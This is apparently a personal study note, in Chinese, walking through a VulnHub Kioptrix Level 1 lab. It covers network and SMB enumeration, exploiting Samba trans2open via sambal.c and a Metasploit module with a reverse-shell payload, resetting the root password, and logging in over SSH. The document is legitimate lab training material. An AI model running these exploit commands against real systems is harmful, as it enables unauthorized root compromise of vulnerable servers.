# 2026-08-28(续2) Kioptrix Level 1 靶机渗透实战（VulnHub 完整流程）

> 状态：✅ 实操过（2026-08-28 打通，Samba trans2open 远程溢出直接 root）
> 靶机：Kioptrix Level 1（VulnHub）· 攻击机：Kali 2025 · 网段：192.168.96.0/24（VMware NAT）
> 参考文章：掘金《【Vulnhub通关】Kioptrix：Level 1 (#1)》
> 首次使用的工具：dirsearch / nbtscan / enum4linux / smbclient（本篇含扫盲）

---

## 一、题目 → 思路

- **目标**：Kioptrix Level 1，拿 root + 交互式 shell
- **一句话认知**：老 Linux 系统 + 老服务版本的靶机，考的是**完整渗透流程 + 服务版本漏洞利用**——不像 DC-1 要绕一大圈，这台从 SMB 服务一炮直接 root
- **考点**：Samba 2.2.x 远程溢出（trans2open，CVE-2003-0201）；备选入口 mod_ssl OpenSSL 0.9.6b（OpenFuck，CVE-2002-0656）
- **完整链路**：找 IP → 扫端口 → 摸服务 → 对版本找洞 → 打 → 稳定访问（SSH）

## 二、工具链顺序（为什么是这个顺序）

| 阶段 | 工具 | 干什么 | 为什么用它 |
|---|---|---|---|
| 1 找目标 | netdiscover | ARP 扫同网段，找靶机 IP | 靶机 IP 未知先定位；Kali 自己不开 80，扫出来开 80 的陌生 IP 就是靶机 |
| 2 摸攻击面 | nmap | 端口 + 服务版本 + 系统识别 | 渗透的"地图"：开放端口 = 攻击面，**服务版本 = 后面选 exp 的依据** |
| 3 探 Web | dirsearch | 爆破网站目录 | 首页是默认页没内容，看有没有隐藏目录/文件/后台 |
| 4 探 SMB | nbtscan | NetBIOS 信息（主机名/工作组） | 139 开了，先低成本收集机器身份信息 |
| 5 深挖 SMB | enum4linux | 枚举共享/用户/系统信息 | 一个命令汇总 SMB 枚举，看有没有匿名可读的信息 |
| 6 试连接 | smbclient | 实际连共享验证 | 枚举说"有共享"，亲手连一下验证能不能匿名访问 |
| 7 找漏洞 | nmap 脚本 / searchsploit | 对服务版本查已知漏洞 | 版本号 → 漏洞库 → 选 exp |
| 8 打 | MSF / sambal.c | 溢出拿 shell | 老 Samba 有现成 exp；MSF 模块验证过最省事 |
| 9 收尾 | ssh | 稳定登录 | 溢出 shell 不稳，改 root 密码后 SSH 慢慢玩 |

**逻辑一句话：一层层收窄** —— 目标在哪 → 开了什么 → 跑着什么 → 有什么洞 → 怎么打 → 怎么稳定进去。每一步都是给下一步提供"依据"。

## 三、过程（含工具扫盲）

### 1. 环境准备

- 靶机是老 vmx 包：内存 64MB → 512MB、virtualHW 7 → 19、网络 bridged → NAT（不然和 Kali 不同网段）
- 网段：VMware NAT 自定义为 `192.168.96.0/24`（不是默认 10.0.2.x）

### 2. 资产发现：netdiscover

```bash
sudo netdiscover -r 192.168.96.0/24
```

- **工具认知**：工作在 ARP 层（发 ARP 请求问"谁在这个网段"），所以**只能扫到同网段**；必须 `sudo`（非 root 会静默空输出）
- 结果：192.168.96.135 带 VMware 厂商字样 = 靶机

### 3. 端口扫描：nmap

```bash
nmap -A -sC -Pn 192.168.96.135
```

| 端口 | 服务 | 版本 |
|---|---|---|
| 22 | SSH | OpenSSH 2.9p2（2002 年的货） |
| 80 | HTTP | Apache 1.3.20 mod_ssl/2.8.4 OpenSSL/0.9.6b |
| 111 | RPC | rpcbind |
| 139 | SMB | Samba 2.2.1a（workgroup PMYGROUP） |
| 443 | HTTPS | Apache mod_ssl 同上 |

- **参数认知**：`-A` 全面扫描（OS+版本+脚本）、`-sC` 跑默认脚本、`-Pn` 跳过 ping（部分靶机禁 ping）
- **关键认知**：看到 2001-2003 年的版本号，第一反应就是"老系统，漏洞一抓一大把"

### 4. Web 目录扫描：dirsearch（第一次用）

```bash
dirsearch -u http://192.168.96.135/ -e php
```

- **工具认知**：基于**字典爆破**的目录扫描器——拿字典里的路径逐个请求，看状态码判断存在与否（200=存在、403=存在但禁止、301=跳转）
- **为什么用它**：首页是 Apache 默认页 = 没内容；要看服务器上还藏着什么目录/文件
- 结果：/manual/、/test.php、/usage/ 都是默认页没价值；但拿到 mod_ssl 2.8.4 版本线索（OpenFuck 路线的依据）
- **坑①**：装 dirsearch 时把 Debian 的源（bullseye-backports）混进 Kali → `apt update` 报 "does not have a Release file" → 删 Debian 源 + 换阿里云 **Kali** 源（是 /kali 不是 /debian）。**教训：Kali 里永远别加 Debian/Ubuntu 的源**

### 5. NetBIOS 探测：nbtscan（第一次用）

```bash
nbtscan -r 192.168.96.135
```

- **工具认知**：NetBIOS 名字服务扫描——拿主机名、工作组、MAC 地址
- **为什么用它**：139 开着，先低成本收集机器身份
- 结果：工作组 MYGROUP/PMYGROUP

### 6. SMB 枚举：enum4linux（第一次用）

```bash
enum4linux 192.168.96.135
```

- **工具认知**：把 rpcclient/smbclient 的枚举功能打包成一个命令，一次性输出共享、用户、RID、系统信息
- 结果：枚举出 administrator/guest/root/bin 等一堆用户（RID 500-550、1000-1050）
- **认知**：这些是 Samba 默认配置 + 系统用户映射出来的，**不代表能登录**——但信息收集阶段全记下来

### 7. SMB 连接：smbclient（第一次用）

```bash
smbclient -L 192.168.96.135          # 列共享
smbclient //192.168.96.135/IPC$      # 匿名连接测试
```

- **工具认知**：Linux 下的 SMB 客户端，`-L` 列共享，直接连就是交互式文件操作
- 结果：IPC$/ADMIN$ 匿名能连上但没有任何操作权限（死路，信息记录即可）

### 8. 漏洞发现：nmap SMB 脚本 + searchsploit

```bash
nmap -p 139 --script=*smb* 192.168.96.135
searchsploit samba 2.2
```

- nmap 结果报了 **CVE-2009-3103** → **大坑（误报陷阱）**
- 真相：CVE-2009-3103 是 **Windows SMBv2** 的漏洞（MS09-050），Samba 2.2 根本不支持 SMBv2，nmap 脚本误报
- 我当时在 MSF 搜这个 CVE 找到 `exploit/windows/smb/ms09_050_smb2_negotiate_func_index`——Windows 专用 DoS 模块，打 Linux 靶机**永远用不上**
- **坑②**：**nmap 脚本扫出来的 CVE 号 ≠ 能用的 exp**。先确认目标系统（Linux/Windows）再决定；文章后续其实用的是另一个漏洞（trans2open）

### 9. 漏洞利用：Samba trans2open（CVE-2003-0201）

选它的理由：Samba 2.2.1a 版本极老 + 139 开放 + searchsploit/MSF 都有现成 exp。

**路 A：sambal.c 编译版（参考文章路线）**

```bash
cp /usr/share/exploitdb/exploits/linux/remote/10.c sambal.c
gcc sambal.c -o sambal
./sambal -b 0 -v 192.168.96.135   # -b 0 = Linux 模式暴力试返回地址
```

- **原理认知**：栈溢出要覆盖返回地址，但**具体地址跟内核/系统环境有关猜不准** → 用一个地址列表逐个试（文章注释：smbd 每次连接都 fork 新进程，所以可以反复试）
- **命中识别**：刷地址时出现 `Worked!` → 当前终端直接进 root shell；绑定 shell 端口 45295（失败时 `nc 192.168.96.135 45295` 可连）
- **坑③**：地址**从头循环第二遍** = 没中，Ctrl+C 换招；试多了可能把 smbd 打崩（139 连不上），重启靶机再打

**路 B：MSF 模块（同一漏洞的另一个实现，最终通关路线）**

```bash
msfconsole -q
use exploit/linux/samba/trans2open
set RHOSTS 192.168.96.135
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST 192.168.96.132       # 自己的 Kali IP，别填反
set TARGET 0                   # 0 = Linux
run
```

#### MSF 和 payload 扫盲（当时最懵的部分）

- **MSF 基本流程**：`search <关键词>` 找模块 → `use <模块>` → `show options` 看要填什么 → `set` 填参数 → `run`
- **RHOSTS = 目标（靶机），LHOST = 自己（Kali）**——reverse 是靶机连 Kali，LHOST 填错就收不到 shell
- **payload 是什么**：溢出成功只是让目标执行了"第一段代码"，payload 是"第二段代码"，决定 shell 怎么到你手里

| payload | 类型 | 特点 |
|---|---|---|
| meterpreter/reverse_tcp | 分阶段（staged） | 先传小 stager 连回来，再传 1MB 大 stage；功能多（文件/提权/截屏）但重 |
| shell_reverse_tcp | 单段（inline） | 一个包直接弹 /bin/sh；轻量稳定 |
| \*reverse（反弹） | — | 靶机主动连攻击机的 LHOST 端口（需要你监听、网络可达） |
| \*bind（绑定） | — | 靶机开端口等你来连（不需要 LHOST，但要能直连靶机） |

- **坑④**：**默认 payload 是 meterpreter 分阶段**——1MB stage 在 2001 年老内核上初始化就崩 → `session N closed. Reason: Died`。换成单段 `shell_reverse_tcp` 就好了。**老靶机优先单段 payload**
- **坑⑤**：一次开 4 个 session（5/6/7/8）是**正常的**——多个返回地址都命中，每个命中弹一个 shell，随便进一个
- **坑⑥**：这个 MSF 版本 `sessions` 命令只认 `sessions 5`（不带 `-i`）

### 10. 提权：不需要，直接 root

- `id` → uid=0(root)
- **为什么直接就是 root**：smbd 守护进程以 root 身份运行，溢出代码在 smbd 进程里执行 → 拿到的 shell 就是 root。老系统"服务跑高权限"是常态，也是现在强调服务最小权限的原因

### 11. SSH 稳定访问（收尾）

```bash
echo 'root:你的新密码' | chpasswd    # MSF shell 没有 TTY，passwd 会报错
```

- **坑⑦**：MSF 的 shell 不是终端（无 TTY），`passwd` 交互式改密码用不了 → 用 `chpasswd` 非交互改
- **坑⑧**：ssh 报 `no matching key exchange method found`——靶机 OpenSSH 2.9p2 只支持 2002 年算法，Kali 新客户端默认全禁用 → 显式放开：

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group1-sha1 \
    -oCiphers=+aes128-cbc,aes256-cbc,3des-cbc -oMACs=+hmac-sha1 root@192.168.96.135
```

- 或写进 `~/.ssh/config` 一劳永逸（`+` 号前缀 = 追加到默认列表）
- **通关确认**：`uname -a` → `Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686`（Red Hat 7.x 时代的 2.4 内核，比文章猜的 2.4.9-2.4.18 还老）

## 四、疑问解答（打靶时的问题）

### Q1: 为什么 CVE-2009-3103 的 exp 用不上？
nmap 在 Samba 上误报了 Windows 的洞。CVE-2009-3103（MS09-050）是 **Windows Vista/2008 的 SMBv2** 漏洞，Kioptrix 是 Linux + Samba 2.2（不支持 SMBv2），MSF 里那个模块是 Windows 专用 DoS。文章作者扫出这个号后也**没用它**，转头用了 sambal.c（CVE-2003-0201）。教训：**CVE 号要先对系统**。

### Q2: 为什么 meterpreter session 一开就 Died？
分阶段 payload 的 stage 有 1MB，要在目标进程里完成加载初始化，老内核（2.4.x）+ 溢出后的脆弱进程扛不住。换单段 shell payload（几十 KB）就稳了。

### Q3: 为什么 trans2open 一打就是 root，不用提权？
被溢出的 smbd 进程本身就是 root 身份。老系统服务跑高权限是常态，这也是现在强调服务最小权限运行的原因。

### Q4: 为什么 ssh 报 no matching key exchange method found？
2002 年的 SSH 服务端只提供 diffie-hellman-group1-sha1 这类老算法，2025 年的客户端默认全禁（安全考虑）。用 `-o` 参数 + 前缀把老算法加回来即可。不是漏洞，是"时代代差"。

### Q5: sambal 为什么一直刷 return address？
栈溢出要猜返回地址。每个地址试一次，命中后 shellcode 才执行。smbd 每次连接都 fork 新进程，所以可以反复试。刷到**从头循环** = 没中；正常 1-2 分钟内该出 `Worked!`。

### Q6: 为什么开了 4 个 session？
暴力试地址时多个地址都命中，每个命中弹一个 shell。选一个用，多余的 `sessions -k` 清掉。

### Q7: reverse 和 bind payload 什么区别？
reverse = 靶机连攻击机（你，LHOST），适合靶机在内网/你能监听；bind = 靶机开端口等你连，适合你能直连靶机。老靶机两个都行，reverse 更常用（不用猜靶机开哪个端口）。

## 五、怎么识别命中

- netdiscover 里带 VMware 字样的陌生 IP = 靶机
- nmap 端口列表 = 攻击面清单
- dirsearch 返回 200 的路径 = 可访问页面
- sambal 出现 `Worked!` / MSF 出现 `Command shell session N opened` = 拿到 shell
- shell 里 `id` 显示 uid=0(root) = 通关
- ssh 能登录 = 稳定访问建立

## 六、方法论沉淀

- **老系统靶机套路**：端口 → 服务版本 → searchsploit/MSF 搜洞。版本号是命脉
- **工具链 = 层层收窄**：定位（netdiscover）→ 摸面（nmap）→ 探服务（dirsearch/nbtscan/enum4linux/smbclient）→ 找洞（searchsploit/nmap 脚本）→ 打（MSF/exp）→ 稳（SSH）
- **nmap 脚本输出要交叉验证**：CVE 号 ≠ 能用，先确认目标系统再搜 exp
- **MSF 老模块 payload 选型**：老靶机优先单段 shell payload（shell_reverse_tcp），分阶段 meterpreter 容易崩；RHOSTS=靶机、LHOST=自己
- **无 TTY 环境改密码**：`echo 'root:密码' | chpasswd` 替代 passwd
- **老 SSH 服务**：`-o` 参数 + 老算法（kex/hostkey/ciphers/macs），或写 `~/.ssh/config` 一劳永逸
- **服务权限认知**：老系统服务以 root 跑 = 打穿服务直接 root，不用提权

## 七、待实践 / 疑问

- [ ] OpenFuck（CVE-2002-0656，443 的 mod_ssl 0.9.6b）——21671.c 在 OpenSSL 3.x 上编不过，找 python 版/其他实现试试
- [ ] Kioptrix Level 2/3 系列
- ❓ nmap 的 smb-vuln-ms09-050 脚本为什么会在 Samba 上误报？（检测逻辑哪一步误判的）
- ❓ meterpreter 的 1MB stage 在老内核上具体崩在哪一步？（符号解析？mprotect？）
- ❓ sambal 绑定 shell 的端口 45295 是 shellcode 硬编码的吗？能改吗？

## 关联笔记

- [DC-1 靶机渗透实战](./2026-08-15-DC1靶机渗透实战.md) — 同样完整流程，对比两台靶机的不同考点
- [操作系统漏洞发现](./2026-08-13-操作系统漏洞发现.md) — searchsploit/漏洞平台用法
- [服务协议与接口漏洞发现](./2026-08-14-服务协议与接口漏洞发现.md) — SMB/NetBIOS 服务协议认知
- [权限提升概述](./2026-08-25(续3)-权限提升概述.md) — 提权起点权限分类（服务类入口）

> ⚠️ 声明：仅用于授权靶场环境（VulnHub 官方练习靶机）。
